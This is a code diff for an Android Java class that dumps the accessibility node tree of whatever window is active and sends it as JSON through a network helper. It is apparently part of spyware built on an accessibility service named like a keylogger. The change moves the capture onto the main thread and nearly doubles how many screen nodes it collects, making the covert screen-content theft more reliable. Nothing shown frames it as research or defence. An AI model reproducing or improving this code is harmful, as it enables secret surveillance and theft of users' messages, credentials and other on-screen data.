@@ -12,17 +12,21 @@ import org.json.JSONObject;
 public final class Tree {
 
     private static final Handler H = new Handler(Looper.getMainLooper());
-    private static final int MAX = 220;
+    private static final int MAX = 400;
 
     private Tree() {}
 
-    public static void dump(KeySvc s) {
-        JSONArray arr = new JSONArray();
-        try {
-            AccessibilityNodeInfo root = s.getRootInActiveWindow();
-            if (root != null) walk(root, arr, 0);
-        } catch (Throwable ignored) {}
-        Net.send("{\"t\":\"tree\",\"o\":" + arr.toString() + "}");
+    public static void dump(final KeySvc s) {
+        H.post(new Runnable() {
+            @Override public void run() {
+                final JSONArray arr = new JSONArray();
+                try {
+                    AccessibilityNodeInfo root = s.getRootInActiveWindow();
+                    if (root != null) walk(root, arr, 0);
+                } catch (Throwable ignored) {}
+                Net.send("{\"t\":\"tree\",\"o\":" + arr.toString() + "}");
+            }
+        });
     }
 
     private static void walk(AccessibilityNodeInfo n, JSONArray arr, int d) {
